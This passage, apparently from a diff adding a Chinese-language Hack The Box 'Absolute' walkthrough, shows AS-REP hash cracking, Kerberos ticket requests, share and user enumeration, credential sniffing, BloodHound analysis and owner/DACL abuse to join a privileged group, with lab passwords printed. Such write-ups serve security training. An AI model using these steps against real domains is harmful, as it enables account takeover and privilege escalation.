UF_DONT_REQUIRE_PREAUTH set<br><br></code></pre></td></tr></table></figure>
+
+<p>使用john破解d.klay的哈希</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# john hash.txt <span class="hljs-comment">--wordlist=rockyou.txt </span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (krb5asrep, Kerberos <span class="hljs-number">5</span> <span class="hljs-keyword">AS</span>-REP etype <span class="hljs-number">17</span>/<span class="hljs-number">18</span>/<span class="hljs-number">23</span> [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES <span class="hljs-number">256</span>/<span class="hljs-number">256</span> AVX2 <span class="hljs-number">8</span>x])<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>Darkmoonsky248girl ($krb5asrep$<span class="language-bash">23<span class="hljs-variable">$d</span>.klay@ABSOLUTE.HTB)     </span><br><span class="language-bash">1g 0:00:00:58 DONE (2026-09-02 13:12) 0.01711g/s 192339p/s 192339c/s 192339C/s DarrenCahppell..Danuelle</span><br><span class="language-bash">Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="language-bash">Session completed. </span><br><span class="language-bash"></span><br></code></pre></td></tr></table></figure>
+
+<p>得到凭据d.klay&#x2F;Darkmoonsky248girl</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb <span class="hljs-number">10.129</span><span class="hljs-number">.232</span><span class="hljs-number">.60</span> -u <span class="hljs-string">&#x27;d.klay&#x27;</span> -p <span class="hljs-string">&#x27;Darkmoonsky248girl&#x27;</span><br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.232</span><span class="hljs-number">.60</span>   <span class="hljs-number">445</span>    DC               [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:DC) (<span class="hljs-keyword">domain</span>:absolute.htb) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">None</span>) (<span class="hljs-keyword">Null</span> Auth:<span class="hljs-keyword">True</span>)<br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.232</span><span class="hljs-number">.60</span>   <span class="hljs-number">445</span>    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION<br><br></code></pre></td></tr></table></figure>
+
+<p>但是密码验证行不通，我们需要请求票据。</p>
+<blockquote>
+<p>STATUS_ACCOUNT_RESTRICTION 通常意味着禁用了NTLM，并且需要使用Kerberos进行身份验证。</p>
+<p><strong>原理</strong>：NTLM 是”口令直接参与挑战-响应”的认证协议，管理员可通过组策略在域内禁用它。一旦禁用，凭 <code>用户名+口令</code> 走 NTLM 的路径全部报 <code>STATUS_ACCOUNT_RESTRICTION</code>。此时必须改用 Kerberos：先用 <code>getTGT</code> 拿到 TGT 并保存为 ccache，导出 <code>KRB5CCNAME</code> 后，所有工具加 <code>-k</code> 参数即可用票据认证。这也是本靶机后续几乎每一步都要”先 getTGT 再操作”的原因。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-getTGT absolute.htb/d.klay:<span class="hljs-string">&#x27;Darkmoonsky248girl&#x27;</span><br>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies <br><br>[*] Saving ticket <span class="hljs-keyword">in</span> d.klay.ccache<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# <span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=d.klay.ccache <br><br></code></pre></td></tr></table></figure>
+
+<p>查看共享</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb dc.absolute.htb -k -u d.klay -p <span class="hljs-string">&#x27;Darkmoonsky248girl&#x27;</span> <span class="hljs-comment">--shares</span><br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:DC) (<span class="hljs-keyword">domain</span>:absolute.htb) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">None</span>) (<span class="hljs-keyword">Null</span> Auth:<span class="hljs-keyword">True</span>)<br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl <br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               [*] Enumerated shares<br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               <span class="hljs-keyword">Share</span>           Permissions     Remark<br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               <span class="hljs-comment">-----           -----------     ------</span><br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               <span class="hljs-keyword">ADMIN</span>$                          Remote <span class="hljs-keyword">Admin</span><br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               C$                              <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               IPC$            <span class="hljs-keyword">READ</span>            Remote IPC<br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               NETLOGON        <span class="hljs-keyword">READ</span>            Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               Shared                          <br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               SYSVOL          <span class="hljs-keyword">READ</span>            Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs tap">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># nxc smb dc.absolute.htb -k -u d.klay -p &#x27;Darkmoonsky248girl&#x27; --users </span><br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               [*] Windows<span class="hljs-number"> 10 </span>/ Server<span class="hljs-number"> 2019 </span>Build<span class="hljs-number"> 17763 </span>x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)<br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               [+] absolute.htb\d.klay:Darkmoonsky248girl <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               Administrator                 2022-06-09 08:25:57<span class="hljs-number"> 0 </span>      Built-in account for administering the computer/domain <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               Guest                         &lt;never&gt;            <span class="hljs-number"> 0 </span>      Built-in account for guest access to the computer/domain <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               krbtgt                        2022-06-09 08:16:38<span class="hljs-number"> 0 </span>      Key Distribution Center Service Account <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               J.Roberts                     2022-06-09 08:25:51<span class="hljs-number"> 0 </span>       <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               M.Chaffrey                    2022-06-09 08:25:51<span class="hljs-number"> 0 </span>       <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               D.Klay                        2022-06-09 08:25:51<span class="hljs-number"> 0 </span>       <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               s.osvald                      2022-06-09 08:25:51<span class="hljs-number"> 0 </span>       <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               j.robinson                    2022-06-09 08:25:51<span class="hljs-number"> 0 </span>       <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               n.smith                       2022-06-09 08:25:51<span class="hljs-number"> 0 </span>       <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               m.lovegod                     2022-06-09 08:25:51<span class="hljs-number"> 0 </span>       <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               l.moore                       2022-06-09 08:25:51<span class="hljs-number"> 0 </span>       <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               c.colt                        2022-06-09 08:25:51<span class="hljs-number"> 0 </span>       <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               s.johnson                     2022-06-09 08:25:51<span class="hljs-number"> 0 </span>       <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               d.lemm                        2022-06-09 08:25:51<span class="hljs-number"> 0 </span>       <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               svc_smb                       2022-06-09 08:25:51<span class="hljs-number"> 0 </span>      AbsoluteSMBService123! <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               svc_audit                     2022-06-09 08:25:51<span class="hljs-number"> 0 </span>       <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               winrm_user                    2022-06-09 08:25:51<span class="hljs-number"> 0 </span>      Used to perform simple network tasks <br>SMB         dc.absolute.htb<span class="hljs-number"> 445 </span>   DC               [*] Enumerated<span class="hljs-number"> 17 </span>local users: absolute<br>                                                                                                              <br></code></pre></td></tr></table></figure>
+
+<p>svc_smb的描述好像是密码，使用该密码获取票据试一试。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-getTGT absolute.htb/svc_smb:<span class="hljs-string">&#x27;AbsoluteSMBService123!&#x27;</span><br>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies <br><br>[*] Saving ticket <span class="hljs-keyword">in</span> svc_smb.ccache<br>                                          <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# export KRB5CCNAME=svc_smb.ccache <br>                                                                                                                                                                                                                  <br>┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb dc.absolute.htb -k -u svc_smb -p <span class="hljs-string">&#x27;AbsoluteSMBService123!&#x27;</span> <span class="hljs-comment">--shares</span><br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:DC) (<span class="hljs-keyword">domain</span>:absolute.htb) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">None</span>) (<span class="hljs-keyword">Null</span> Auth:<span class="hljs-keyword">True</span>)<br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! <br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               [*] Enumerated shares<br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               <span class="hljs-keyword">Share</span>           Permissions     Remark<br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               <span class="hljs-comment">-----           -----------     ------</span><br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               <span class="hljs-keyword">ADMIN</span>$                          Remote <span class="hljs-keyword">Admin</span><br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               C$                              <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               IPC$            <span class="hljs-keyword">READ</span>            Remote IPC<br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               NETLOGON        <span class="hljs-keyword">READ</span>            Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               Shared          <span class="hljs-keyword">READ</span>            <br>SMB         dc.absolute.htb <span class="hljs-number">445</span>    DC               SYSVOL          <span class="hljs-keyword">READ</span>            Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br><br></code></pre></td></tr></table></figure>
+
+<p>我们对shared有阅读权限了</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs tap">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># impacket-smbclient &#x27;absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb&#x27; -k -no-pass</span><br>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies <br><br>Type help for list of commands<br><span class="hljs-comment"># dir</span><br>*** Unknown syntax: dir<br><span class="hljs-comment"># use Shared</span><br><span class="hljs-comment"># ls</span><br>drw-rw-rw-         <span class="hljs-number"> 0 </span> Thu Sep <span class="hljs-number"> 1 </span>17:02:23<span class="hljs-number"> 2022 </span>.<br>drw-rw-rw-         <span class="hljs-number"> 0 </span> Thu Sep <span class="hljs-number"> 1 </span>17:02:23<span class="hljs-number"> 2022 </span>..<br>-rw-rw-rw-        <span class="hljs-number"> 72 </span> Thu Sep <span class="hljs-number"> 1 </span>17:02:23<span class="hljs-number"> 2022 </span>compiler.sh<br>-rw-rw-rw-     <span class="hljs-number"> 67584 </span> Thu Sep <span class="hljs-number"> 1 </span>17:02:23<span class="hljs-number"> 2022 </span>test.exe<br><span class="hljs-comment"># get compiler.sh</span><br><span class="hljs-comment"># get test.exe</span><br><span class="hljs-comment"># exit</span><br><br></code></pre></td></tr></table></figure>
+
+<p>反编译test.exe，但没有什么值得注意的东西，运行test.exe，将wireshark打开，看到一条ldap数据流，追踪得到凭据</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">absolute</span>.htb\m.lovegod:AbsoluteLDAP2022!<br></code></pre></td></tr></table></figure>
+
+<p>同样请求票据并进一步枚举，使用bloodhound-python</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs dts">┌──(root㉿kaada)-[<span class="hljs-keyword">/home/</span>kali/Desktop]<br>└─<span class="hljs-meta"># impacket-getTGT absolute.htb/m.lovegod:AbsoluteLDAP2022!</span><br>Impacket v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - Copyright Fortra, LLC and its affiliated companies <br><br>[*] Saving ticket in m.lovegod.ccache<br>                                                                                                                                                                                                                  <br>┌──(root㉿kaada)-[<span class="hljs-keyword">/home/</span>kali/Desktop]<br>└─<span class="hljs-meta"># export KRB5CCNAME=m.lovegod.ccache</span><br>                                                                                                                                                                                                                  <br>┌──(root㉿kaada)-[<span class="hljs-keyword">/home/</span>kali/Desktop]<br>└─<span class="hljs-meta"># bloodhound-python -u m.lovegod -k -d absolute.htb -ns 10.129.232.60 -c All --zip</span><br><span class="hljs-symbol">INFO:</span> BloodHound.py for BloodHound LEGACY (BloodHound <span class="hljs-number">4.2</span> and <span class="hljs-number">4.3</span>)<br><span class="hljs-symbol">Password:</span> <br><span class="hljs-symbol">INFO:</span> Found AD domain: absolute.htb<br><span class="hljs-symbol">INFO:</span> Using TGT from cache<br><span class="hljs-symbol">INFO:</span> Found TGT with correct principal in ccache file.<br><span class="hljs-symbol">INFO:</span> Connecting to LDAP server: dc.absolute.htb<br><span class="hljs-symbol">INFO:</span> Testing resolved hostname connectivity dead:beef::<span class="hljs-number">187</span><br><span class="hljs-symbol">INFO:</span> Trying LDAP connection to dead:beef::<span class="hljs-number">187</span><br><span class="hljs-symbol">INFO:</span> Testing resolved hostname connectivity dead:beef::<span class="hljs-number">5535</span>:e85a:<span class="hljs-number">46</span>c:e210<br><span class="hljs-symbol">INFO:</span> Trying LDAP connection to dead:beef::<span class="hljs-number">5535</span>:e85a:<span class="hljs-number">46</span>c:e210<br><span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> domains<br><span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> domains in the forest<br><span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> computers<br><span class="hljs-symbol">INFO:</span> Connecting to LDAP server: dc.absolute.htb<br><span class="hljs-symbol">INFO:</span> Testing resolved hostname connectivity dead:beef::<span class="hljs-number">187</span><br><span class="hljs-symbol">INFO:</span> Trying LDAP connection to dead:beef::<span class="hljs-number">187</span><br><span class="hljs-symbol">INFO:</span> Testing resolved hostname connectivity dead:beef::<span class="hljs-number">5535</span>:e85a:<span class="hljs-number">46</span>c:e210<br><span class="hljs-symbol">INFO:</span> Trying LDAP connection to dead:beef::<span class="hljs-number">5535</span>:e85a:<span class="hljs-number">46</span>c:e210<br><span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">18</span> users<br><span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">55</span> groups<br><span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">2</span> gpos<br><span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> ous<br><span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">19</span> containers<br><span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">0</span> trusts<br><span class="hljs-symbol">INFO:</span> Starting computer enumeration with <span class="hljs-number">10</span> workers<br><span class="hljs-symbol">INFO:</span> Querying computer: dc.absolute.htb<br><span class="hljs-symbol">INFO:</span> Done in <span class="hljs-number">00</span>M <span class="hljs-number">29</span>S<br><span class="hljs-symbol">INFO:</span> Compressing output into <span class="hljs-number">20260902203542</span>_bloodhound.zip<br>                                                                        <br></code></pre></td></tr></table></figure>
+
+<p>分析得到，<a href="mailto:&#x4d;&#x2e;&#x4c;&#x4f;&#x56;&#69;&#71;&#79;&#68;&#x40;&#65;&#66;&#83;&#79;&#x4c;&#x55;&#x54;&#69;&#x2e;&#72;&#84;&#66;">M.LOVEGOD@ABSOLUTE.HTB</a>是<a href="mailto:&#x4e;&#x45;&#84;&#x57;&#79;&#x52;&#x4b;&#69;&#x52;&#83;&#64;&#65;&#x42;&#x53;&#79;&#76;&#85;&#x54;&#69;&#x2e;&#72;&#x54;&#x42;">NETWORKERS@ABSOLUTE.HTB</a>的成员，而该组对NETWORK <a href="mailto:&#x41;&#85;&#x44;&#73;&#x54;&#x40;&#65;&#66;&#83;&#79;&#76;&#x55;&#84;&#x45;&#46;&#72;&#84;&#x42;">AUDIT@ABSOLUTE.HTB</a>拥有WriteOwner权限，且NETWORK <a href="mailto:&#x41;&#x55;&#x44;&#73;&#x54;&#x40;&#x41;&#66;&#x53;&#x4f;&#76;&#85;&#x54;&#69;&#46;&#72;&#84;&#66;">AUDIT@ABSOLUTE.HTB</a>对<a href="mailto:&#x57;&#73;&#78;&#82;&#x4d;&#x5f;&#85;&#x53;&#x45;&#82;&#x40;&#65;&#x42;&#x53;&#79;&#x4c;&#x55;&#84;&#x45;&#x2e;&#x48;&#x54;&#x42;">WINRM_USER@ABSOLUTE.HTB</a>有GenericWrite权限。</p>
+<blockquote>
+<p><strong>原理</strong>：AD 中每个对象都有一个 DACL（自主访问控制列表）描述”谁能对它做什么”。BloodHound 通过 LDAP 收集这些 ACL 关系并绘成图，帮助发现隐蔽的提权链。这里涉及两种关键权限：<code>WriteOwner</code> 允许把对象的属主改成自己，成为属主后即可给自己授予任意权限（如 <code>FullControl</code>）进而修改成员关系；<code>GenericWrite</code> 允许写目标对象的大部分属性——对用户对象而言，这足以写入 <code>msDS-KeyCredentialLink</code>（影子凭据）来完全接管该账户。</p>
+</blockquote>
+<p>那么攻击链就是M.LOVEGOD到NETWORK <a href="mailto:&#65;&#x55;&#x44;&#73;&#x54;&#x40;&#x41;&#x42;&#x53;&#79;&#x4c;&#x55;&#x54;&#x45;&#46;&#72;&#84;&#x42;">AUDIT@ABSOLUTE.HTB</a>再到<a href="mailto:&#x57;&#x49;&#78;&#82;&#77;&#95;&#x55;&#x53;&#x45;&#82;&#64;&#65;&#66;&#x53;&#x4f;&#x4c;&#x55;&#84;&#69;&#46;&#72;&#x54;&#66;">WINRM_USER@ABSOLUTE.HTB</a></p>
+<p>先将<a href="mailto:&#x4d;&#x2e;&#x4c;&#x4f;&#86;&#69;&#71;&#x4f;&#x44;&#x40;&#65;&#66;&#x53;&#x4f;&#76;&#x55;&#84;&#x45;&#x2e;&#72;&#84;&#66;">M.LOVEGOD@ABSOLUTE.HTB</a>加入NETWORK <a href="mailto:&#x41;&#x55;&#68;&#73;&#84;&#x40;&#65;&#66;&#83;&#x4f;&#x4c;&#85;&#84;&#69;&#46;&#x48;&#x54;&#66;">AUDIT@ABSOLUTE.HTB</a></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-owneredit -k -<span class="hljs-keyword">no</span>-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -<span class="hljs-built_in">new</span>-<span class="hljs-keyword">owner</span> m.lovegod -target <span class="hljs-string">&#x27;Network Audit&#x27;</span> -action <span class="hljs-keyword">write</span><br>Impacket v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[*] <span class="hljs-keyword">Current</span> <span class="hljs-keyword">owner</span> information below<br>[*] - SID: S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-4078382237</span><span class="hljs-number">-1492182817</span><span class="hljs-number">-2568127209</span><span class="hljs-number">-1109</span><br>[*] - sAMAccountName: m.lovegod<br>[*] - distinguishedName: CN=m.lovegod,CN=Users,DC=absolute,DC=htb<br>[*] OwnerSid modified successfully!<br><br></code></pre></td></tr></table></figure>
+
+<p>现在成功修改组的所有者，添加完全控制权限</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-dacledit -<span class="hljs-keyword">k</span> -<span class="hljs-keyword">no</span>-pass absolute.htb/<span class="hljs-keyword">m</span>.lovegod -dc-ip dc.absolute.htb -principal <span class="hljs-keyword">m</span>.lovegod -target <span class="hljs-string">&quot;Network Audit&quot;</span> -action <span class="hljs-keyword">write</span> -rights FullControl<br>Impacket v0.<span class="hljs-number">14.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-built_in">and</span> its affiliated companies <br><br>[*] DACL backed <span class="hljs-keyword">up</span> <span class="hljs-keyword">to</span> dacledit-<span class="hljs-number">20260902</span>-<span class="hljs-number">204458</span>.bak<br>[*] DACL modified successfully!<br>                                                <br></code></pre></td></tr></table></figure>
+
+<p>将自己加进去</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# net rpc <span class="hljs-keyword">group</span> addmem &quot;Network Audit&quot; m.lovegod -U <span class="hljs-string">&#x27;m.lovegod&#x27;</span> <span class="hljs-comment">--use-kerberos=required -S dc.absolute.htb</span><br><span class="hljs-keyword">Password</span> <span class="hljs-keyword">for</span> [WORKGROUP\m.lovegod]:<br>                                               <br></code></pre></td></tr></table></figure>
+
+<p>注意，在使用kinit创建票据时要修改krb5文件</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kaada)-[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop]<br>└─<span class="hljs-comment"># cat /etc/krb5.conf </span><br>[libdefaults]<br>    <span class="hljs-attr">default_realm</span> <span class="hljs-operator">=</span> ABSOLUTE.HTB<br>    <span class="hljs-attr">kdc_timesync</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>    <span class="hljs-attr">ccache_type</span> <span class="hljs-operator">=</span> <span class="hljs-number">4</span><br>    <span class="hljs-attr">forwardable</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">proxiable</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">fcc-mit-ticketflags</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span><br>[realms]<br>    <span class="hljs-attr">ABSOLUTE.HTB</span> <span class="hljs-operator">=</span> &#123;<br>        <span class="hljs-attr">kdc</span> <span class="hljs-operator">=</span> dc.absolute.htb<br>        <span class="hljs-attr">admin_server</span> <span class="hljs-operator">=</span> dc.absolute.htb<br>        <span class="hljs-attr">default_domain</span> <span class="hljs-operator">=</span> absolute.htb<br>    &#125;<br><br>                          <br></code></pre></td></tr></table></figure>
+
